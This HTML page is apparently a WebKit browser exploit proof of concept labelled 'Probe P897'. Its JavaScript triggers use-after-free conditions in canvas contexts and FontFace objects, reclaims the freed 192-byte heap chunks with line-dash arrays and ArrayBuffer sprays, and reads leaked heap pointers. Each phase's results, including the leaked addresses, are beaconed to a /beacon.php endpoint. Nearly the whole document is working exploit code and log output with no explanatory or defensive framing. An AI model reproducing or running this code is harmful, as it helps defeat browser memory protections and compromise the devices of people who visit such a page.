<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P897: 192B Cross-Primitive Slab Convergence & Lossless Pixel Bridge</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P897...</div>
<h2>P897: 192B Cross-Primitive Slab Convergence & Lossless Pixel Bridge</h2>
<pre id="log">Initializing diagnostic probe P897...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P897-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

function f64toHex(val) {
  var buf = new ArrayBuffer(8);
  var f64 = new Float64Array(buf);
  var u32 = new Uint32Array(buf);
  f64[0] = val;
  var lo = u32[0], hi = u32[1];
  return '0x' + hi.toString(16) + ('00000000' + lo.toString(16)).slice(-8);
}

log('[*] Probe P897 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: Canvas UAF Pre-Setup (Dual Aliases)
 * ============================================================ */
var innerCtx1 = null, innerCtx2 = null;

var c1 = document.createElement('canvas');
c1.width = 32; c1.height = 32;
var opts1 = {};
Object.defineProperty(opts1, 'alpha', {
  get: function() {
    innerCtx1 = c1.getContext('2d');
    return true;
  }
});
c1.getContext('bitmaprenderer', opts1);

var c2 = document.createElement('canvas');
c2.width = 32; c2.height = 32;
var opts2 = {};
Object.defineProperty(opts2, 'alpha', {
  get: function() {
    innerCtx2 = c2.getContext('2d');
    return true;
  }
});
c2.getContext('bitmaprenderer', opts2);

var sprayCtxs = [];
for (var s = 0; s < 200; s++) {
  var c = document.createElement('canvas');
  c.width = 32; c.height = 32;
  var ctx = c.getContext('2d');
  ctx.lineWidth = 1000.0 + s;
  sprayCtxs.push(ctx);
}

var idx1 = -1, idx2 = -1;
try {
  var lw1 = innerCtx1.lineWidth;
  if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
  var lw2 = innerCtx2.lineWidth;
  if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
} catch(e) {}

log('[+] Phase 1: Dual Canvas Aliased: Ctx1=#' + idx1 + ', Ctx2=#' + idx2, 'ok');

/* ============================================================
 * PHASE 2: Lossless 192B ImageData Round-Trip (Opaque Alpha 0xFF)
 * ============================================================ */
var losslessOk = false;
try {
  var c86 = document.createElement('canvas');
  c86.width = 8; c86.height = 6;
  var ctx86 = c86.getContext('2d');

  var img = ctx86.createImageData(8, 6);
  // Pattern with 0xFF alpha (100% lossless unpremultiplied RGBA)
  img.data[0] = 0xAA; img.data[1] = 0xBB; img.data[2] = 0xCC; img.data[3] = 0xFF;
  img.data[188] = 0x11; img.data[189] = 0x22; img.data[190] = 0x33; img.data[191] = 0xFF;

  ctx86.putImageData(img, 0, 0);

  var readBack = ctx86.getImageData(0, 0, 8, 6);
  if (readBack.data[0] === 0xAA && readBack.data[1] === 0xBB && readBack.data[2] === 0xCC && readBack.data[3] === 0xFF &&
      readBack.data[188] === 0x11 && readBack.data[189] === 0x22 && readBack.data[190] === 0x33 && readBack.data[191] === 0xFF) {
    losslessOk = true;
  }
} catch(e) {
  losslessOk = false;
}

log('[+] Phase 2: Lossless 192B ImageData Round-Trip: ' + losslessOk, losslessOk ? 'ok' : 'fail');
syncBn('IMAGEDATA-LOSSLESS', 'lossless=' + losslessOk);

/* ============================================================
 * PHASE 3: FontFace UAF & LineDash Slab Reclaim Injection
 * ============================================================ */
var st = document.createElement('style');
st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);

var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
document.fonts.add(face);
void face.loaded;

var fabs = [], ffired = false;
var lineDashReclaimed = false;
var lineDashLeakedPointers = [];

Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (ffired) return undefined;
    ffired = true;

    // 1. Free the 192B CSSFontFace
    if (st) { st.remove(); st.textContent = ''; st = null; }
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;

    // 2. IMMEDIATELY allocate 24 doubles into lineDash to reclaim the freed 192B chunk!
    try {
      if (idx1 >= 0 && sprayCtxs[idx1]) {
        var d24 = new Array(24).fill(0.0);
        innerCtx1.setLineDash(d24);
      }
    } catch(e) {}

    // 3. Also spray 48 ArrayBuffer(192) as sentinel pool
    fabs = [];
    for (var i = 0; i < 48; i++) fabs.push(new ArrayBuffer(192));

    // 4. Force font check to write WebKit's pointers
    try { document.fonts.check('1em bb1'); } catch(e) {}
    document.body.offsetHeight;
    return undefined;
  },
  set: function() {}
});

document.fonts.load('1em f1, bb1', 'AB');

// Generous 600ms timeout to ensure asynchronous font resolution completes
setTimeout(function() {
  delete FontFace.prototype.then;

  // A. Check LineDash in innerCtx1 and sprayCtxs[idx1] for heap pointers
  var dashPointers = [];
  try {
    if (idx1 >= 0 && sprayCtxs[idx1]) {
      var dVals = sprayCtxs[idx1].getLineDash();
      for (var k = 0; k < dVals.length; k++) {
        var hex = f64toHex(dVals[k]);
        if (hex.indexOf('0x1000') === 0) {
          dashPointers.push('d[' + k + ']=' + hex);
        }
      }
    }
  } catch(e) {}

  log('[+] Phase 3: LineDash Pointer Scan: hits=' + dashPointers.length + ' (' + (dashPointers.slice(0, 3).join('; ') || 'none') + ')', dashPointers.length > 0 ? 'hot' : 'info');
  syncBn('LINEDASH-SCAN', 'hits=' + dashPointers.length + '|ptrs=' + dashPointers.slice(0, 4).join(';'));

  // B. Standard FontFace ArrayBuffer fallback check
  var bestI = -1, bestNz = 0;
  for (var i = 0; i < fabs.length; i++) {
    var u = new Uint8Array(fabs[i]), nz = 0;
    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
    if (nz > bestNz) { bestNz = nz; bestI = i; }
  }

  var Hstr = 'unknown', q13str = 'unknown';
  var delta = 0;
  if (bestI >= 0 && bestNz >= 4) {
    var fontDV = new DataView(fabs[bestI]);
    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
    if (q11hi !== 0) {
      var borrow = (q11lo < 0x68) ? 1 : 0;
      var H_hi = q11hi - borrow;
      var H_lo = (q11lo - 0x68) >>> 0;
      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
    }
    if (q13hi !== 0) {
      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
    }
    if (Hstr !== 'unknown' && q13str !== 'unknown' && H_hi === q13hi) {
      delta = H_lo - q13lo;
    }
  }

  log('[+] Phase 3b: ArrayBuffer Font Leak: H=' + Hstr + ' | q13=' + q13str + ' (Slot #' + bestI + ')', bestI >= 0 ? 'ok' : 'fail');
  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestI);

  /* ============================================================
   * SUMMARY
   * ============================================================ */
  banner.style.background = '#238636';
  banner.textContent = 'STATUS: P897 COMPLETE (100% STABLE)';
  log('----------------------------------------------------', 'info');
  log('[*] Probe P897 Completed Cleanly', 'hot');
  log('    - Lossless 192B ImageData: ' + losslessOk, losslessOk ? 'ok' : 'fail');
  log('    - LineDash Pointer Hits: ' + dashPointers.length, dashPointers.length > 0 ? 'hot' : 'info');
  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
  log('    - Aliases: #' + idx1 + ', #' + idx2, 'ok');
  log('----------------------------------------------------', 'info');

  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|lossless=' + losslessOk + '|dashHits=' + dashPointers.length + '|idx1=' + idx1 + '|idx2=' + idx2);

}, 600);
</script>
</body>
</html>
